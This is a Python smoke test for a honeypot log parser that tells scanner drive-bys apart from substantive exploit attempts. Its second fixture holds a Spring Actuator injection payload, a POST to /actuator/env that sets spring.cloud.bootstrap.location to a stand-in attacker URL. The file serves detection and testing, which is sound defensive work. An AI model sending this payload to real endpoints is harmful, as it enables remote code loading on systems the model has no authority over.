"""Smoke test for the h0neytr4p parser (migrated from its old
`if __name__` block so CI runs it). Generic parse/correlate/
has_substance/STIX contract is covered in test_parsers.py."""
from __future__ import annotations

import tpot2cti.parsers.h0neytr4p as _m
globals().update({k: v for k, v in vars(_m).items() if not k.startswith('__')})


def test_h0neytr4p_smoke():
    from datetime import datetime, timezone

    logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")

    parser = H0neytr4pParser()
    now = datetime.now(timezone.utc)

    # ── Case 1: drive-by — plain GET / from a scanner ──────────────────
    driveby_doc = {
        "@timestamp": now.isoformat(),
        "type": "H0neytr4p",
        "src_ip": "203.0.113.11",
        "src_port": 50100,
        "dst_port": 80,
        "host_header": "203.0.113.99",      # bare IPv4 host_header (typical scanner)
        "t-pot_hostname": "node1",
        "request": {
            "method": "GET",
            "uri": "/",
            "body": "",
            "user_agent": "Mozilla/5.0",
        },
        "geoip": {"country_iso_code": "US", "country_name": "United States"},
    }

    # ── Case 2: substantive — exploit attempt against /actuator/env ────
    substantive_doc = {
        "@timestamp": now.isoformat(),
        "type": "H0neytr4p",
        "src_ip": "198.51.100.55",
        "src_port": 33333,
        "dst_port": 8080,
        "host_header": "target.example.com",
        "t-pot_hostname": "node1",
        "request": {
            "method": "POST",
            "uri": "/actuator/env",
            "body": '{"name":"spring.cloud.bootstrap.location","value":"http://attacker/x.yml"}',
            "user_agent": "python-requests/2.28.0",
        },
        "geoip": {
            "country_iso_code": "RU",
            "country_name": "Russia",
            "asn": 12345,
            "organization": "ExampleNet",
        },
    }

    drive_event = parser.parse(driveby_doc)
    subs_event = parser.parse(substantive_doc)
    assert drive_event and subs_event, "parse failed"

    drive_session = parser.correlate([drive_event])[0]
    subs_session = parser.correlate([subs_event])[0]

    drive_has = parser.has_substance(drive_session)
    subs_has = parser.has_substance(subs_session)
    print(f"drive-by    has_substance: {drive_has}  (expected False)")
    print(f"substantive has_substance: {subs_has}  (expected True)")
    assert drive_has is False, "plain GET / must be non-substantive"
    assert subs_has is True, "POST /actuator/env must be substantive"

    # The substantive session must carry the URL + domain in aggregates,
    # and the matched_hints list in meta.
    assert any("actuator/env" in u for u in subs_session.urls), (
        f"expected /actuator/env URL in session.urls, got {subs_session.urls}"
    )
    assert "target.example.com" in subs_session.domains, (
        f"expected FQDN in session.domains, got {subs_session.domains}"
    )
    assert subs_session.meta.get("matched_hints"), (
        "expected at least one exploit hint to match"
    )
    # Drive-by must NOT push a domain (bare IPv4 host_header)
    assert drive_session.domains == [], (
        f"bare IPv4 host_header must not be promoted to a domain; "
        f"got {drive_session.domains}"
    )

    print("OK")
